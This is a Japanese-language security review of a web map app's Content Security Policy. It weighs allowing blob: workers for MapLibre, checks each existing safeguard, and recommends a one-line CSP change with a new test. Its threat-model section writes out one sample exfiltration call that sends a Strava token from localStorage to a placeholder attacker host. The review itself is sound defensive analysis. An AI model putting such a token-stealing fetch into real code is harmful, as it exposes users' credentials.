# map-rendering audit — reviewer A (CSP / セキュリティ境界)

## 重要事実 (= 7 軸の前提)

CSP 違反元は **MapLibre 自身**であって pmtiles 単独ではない:

- `web/lib/vendor/maplibre-gl.js:34` で `maplibregl.setWorkerUrl(URL.createObjectURL(new Blob([workerBundleString], { type: 'text/javascript' })))` を起動時に実行 (= self-bundled worker、 同 file に worker bundle string を内包)
- `web/lib/vendor/pmtiles.js:786` の `new Blob` は `type: mimeType` 画像 blob を `el.src` に assign する経路 (= raster tile を Image element に渡す) で、 worker 起動ではない (= img-src の domain)
- 従って worker-src 緩和は MapLibre が動く前提条件、 pmtiles だけ差し替えても解決しない

これが「案 A vs 案 B」の選択基準を決定的に変える: **案 B (pmtiles 差し替え) は本問題を解決しない**、 MapLibre 自体を捨てない限り blob worker は出続ける。

## 7 軸

### 1. register (責務境界) — **LOAD-BEARING**

CSP は `index.html` meta tag 集中で single source、 ε-1〜ε-9 で他 module に CSP 文字列を散在させていない。 viewer の addProtocol 登録は CSP と独立。 worker-src を足しても集中点は維持される。

### 2. 語彙 — **MINOR**

`worker-src` `blob:` `script-src fallback` は W3C CSP3 用語、 既存 brief 33 §11.5 の語彙と整合。 import map 等は使っていないので名前衝突なし。

### 3. 抽象段差 — **MINOR**

CSP 設定が「meta tag (= 単点) + MapLibre 自前 worker (= ベンダ依存挙動) + pmtiles addProtocol (= MapLibre プラグイン層)」の 3 層に見えるが、 worker-src 緩和は meta tag 1 行で済む、 段差は表面的。

### 4. test — **LOAD-BEARING**

`brief33_grep_gate.test.js:40` が「script-src に unsafe-inline を含まない」を grep gate で pin している。 worker-src `blob:` 追加は script-src には触れないので既存 gate を破らないが、 **worker-src 緩和を明示 pin する新規 test を足すべき** (= `worker-src 'self' blob:` が存在することを assert、 将来 worker-src を消した時に CI で気づく)。 blob worker の actual 起動は jsdom では発火しないので、 grep test + 手動 chrome 検証の 2 段。

### 5. 設計境界 (= 4 重 gate の弱化評価) — **LOAD-BEARING**

brief 33 §11.5 の 4 重 gate を 1 つずつ再評価:

- (a) `script-src 'self'` → 維持 (= worker-src は script-src と独立 directive、 fallback を切るだけ)
- (b) `unsafe-inline` 禁止 → 維持 (= worker-src には unsafe-inline 設定なし)
- (c) vendoring (= 外部 CDN 禁止) → 維持 (= blob: は same-origin 派生、 外部 URL 取得経路を生まない)
- (d) `revokeLocalToken` 経路 → CSP と独立 (= localStorage 操作層、 影響なし)

4 重 gate のうち (a)〜(d) のいずれも弱まらない。 worker-src 緩和は **「script-src の fallback による副次的な worker 起動拒否」を「同じ厳格度の専用 directive」に置き換える**操作、 net で見ると surface は同等。

### 6. マイグレ可逆 — **MINOR**

meta tag 1 行 (= `worker-src 'self' blob:` 追記) の追加と revert、 ε-1〜ε-9 不変条件に対する破壊なし。 grep gate も「unsafe-inline 非含有」「script-src self」を assert しているのみで、 worker-src の有無は assert していないため revert で red にならない。

### 7. security (= XSS surface) — **BLOCK 該当だが回避可能、 結論 LOAD-BEARING**

「`blob:` 許可で XSS payload 経由の任意 worker 起動」シナリオの実害評価:

1. XSS が成立する前提が必要 (= `script-src 'self'` + `unsafe-inline` 禁止 + 全 inline script externalize で**XSS 入口は既に物理 block 済**)
2. 攻撃者が任意 JS を実行できる状況なら、 worker-src の有無に関わらず `fetch('https://attacker/exfil', {body: localStorage.getItem('fujihc.strava.token')})` で token 抜ける ── つまり worker 経由の追加 surface は marginal
3. ただし `connect-src` は `'self' https://www.strava.com https://*.strava.com` に絞ってあるため、 attacker domain への直接 fetch は止まる。 worker 経由でも同じ connect-src 制約を受ける (= worker からの fetch は親 document の connect-src を継承)
4. 残る surface: worker 内で long-running 攻撃 (cryptomining 等)。 ただし XSS 成立前提が外せない、 二重制約

**結論**: worker-src `'self' blob:` は XSS 入口閉鎖 (= script-src + unsafe-inline 禁止 + connect-src 絞り込み) を前提に許容できる surface 拡大、 実害は marginal。 ただし worker 経由 fetch も connect-src 制約下に置かれることを **新規 grep gate で明示 pin** する義務あり (= 「connect-src に attacker-controlled domain が無い」assertion を強化)。

## 推奨 fix 案 (= 案 A 採用、 ただし条件付き)

**案 A (worker-src 緩和) を採用する**。 案 B は本問題を解決しないため候補から外す。

実装:

1. `web/index.html:7` の CSP meta に `worker-src 'self' blob:` を追加 (= 1 行追記)
2. `web/oauth-callback.html:5` も同様 (= 統一性、 ただし oauth-callback は MapLibre 起動しないので不要、 統一性で揃えるかは判断)
3. `web/tests/brief33_grep_gate.test.js` に `worker-src 'self' blob:` 存在 assert を追加 (= 将来の revert 検知)
4. `worker-src` directive を**追加するだけで `script-src 'self'` は変えない** (= 4 重 gate 維持)
5. user 訪問の最初の挙動 (= intro overlay 表示) は worker 不要、 worker-src 緩和は intro 通過後の地図描画時にのみ effect

**revert 判定基準** (= 将来この緩和を撤回したくなった時の trigger): MapLibre upstream で `setWorkerUrl(blob)` 経路が non-blob 化された build (= ES module worker 形式) が登場したら revert 検討。 現在 v4.x は self-bundled blob worker、 v5 で見直し議論中だが未確定。

## 案 B 非採用の理由 (= 念のため明記)

pmtiles を non-worker build に差し替えても、 **MapLibre 自身が起動時に blob worker を立てる** (= maplibre-gl.js:34 の `setWorkerUrl`) のでブロック解消しない。 pmtiles vendoring 差し替えは効果ゼロ + 工数大、 採用すべきでない。

## 残課題 (= reviewer B 担当領域への申し送り)

- Range request エラー (= `Server returned no content-length`) は CSP 領域外、 reviewer B (= pmtiles serving / infra) の判断待ち
- ローカル開発 server (= python http.server) と GitHub Pages 本番の挙動差は CSP では解決しない、 sec 軸からは「本番側で Range serving 動作確認」推奨のみ
